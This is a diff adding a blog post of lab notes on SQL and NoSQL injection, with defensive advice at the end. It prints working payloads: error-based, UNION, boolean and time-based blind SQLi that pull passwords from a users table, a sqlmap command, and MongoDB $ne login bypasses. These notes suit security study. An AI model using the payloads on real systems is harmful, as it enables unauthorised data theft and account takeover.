@@ -1,0 +1,85 @@
+---
+title: "SQL & NoSQL injection — lab notes (ESI-SBA)"
+date: "2026-03-02"
+platform: "ESI-SBA Labs"
+difficulty: "medium"
+tags: ["sqli", "nosql", "web", "notes", "burp"]
+excerpt: "Condensed notes from the injection labs: error-based, UNION, blind and time-based SQLi, plus NoSQL auth bypass — with the payloads that actually worked."
+---
+
+> These are my working notes from the SQL/NoSQL injection labs. Full solutions live in the [GitHub repo](https://github.com/amdjadmoh/SQL-NoSQL-Injection-Labs-ESI-SBA---Solutions-Guide).
+
+## finding the injection point
+
+Any parameter that lands in a query is a candidate. Probe with a quote and watch the app bleed:
+
+```sql
+'           -- does it throw a SQL error?  -> error-based
+' OR '1'='1 -- does the logic change?      -> maybe bypassable
+```
+
+The golden rule: **the error message is your debugger.** If the app echoes the DB error, it tells you the engine, the query shape, sometimes the table names.
+
+## error-based
+
+Force the DB to leak data inside its own error:
+
+```sql
+' AND extractvalue(1, concat(0x3a, (SELECT @@version)))-- -
+```
+
+## UNION-based
+
+Requirements: same column count, compatible types. Find the count with `ORDER BY n`, then leak:
+
+```sql
+' ORDER BY 3-- -                 -- works? try 4... until it errors
+' UNION SELECT NULL, database(), user()-- -
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -
+```
+
+## blind — boolean
+
+No errors, no output. Only "page looks normal" vs "page looks different". Ask yes/no questions, one bit at a time:
+
+```sql
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a'-- -
+```
+
+Painfully slow by hand — this is what `sqlmap` automates:
+
+```bash
+$ sqlmap -u "http://target/item?id=1" --batch --dbs
+```
+
+## blind — time-based
+
+When even the page difference is gone, make the DB *sleep* and measure response time:
+
+```sql
+' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(3), 0)-- -
+```
+
+## NoSQL injection
+
+Different beast, same disease — unsanitized input in the query. Against a Mongo login form:
+
+```json
+{ "username": { "$ne": null }, "password": { "$ne": null } }
+```
+
+Or in a URL parameter, operator injection:
+
+```
+GET /login?user[$ne]=x&pass[$ne]=x
+```
+
+`$ne: null` matches *any* document where the field is not null → first user in the collection, usually the admin.
+
+## how to not get owned
+
+- **Prepared statements / parameterized queries.** Not string concatenation. Ever.
+- Type-check and allowlist input (an ID should match `^\d+$`).
+- Least-privilege DB users — the web app doesn't need `FILE` or `DROP`.
+- Generic error pages. Your stack trace is reconnaissance.
+- For NoSQL: sanitize operators (`$where`, `$ne`, `$gt`) and never `eval()` input.
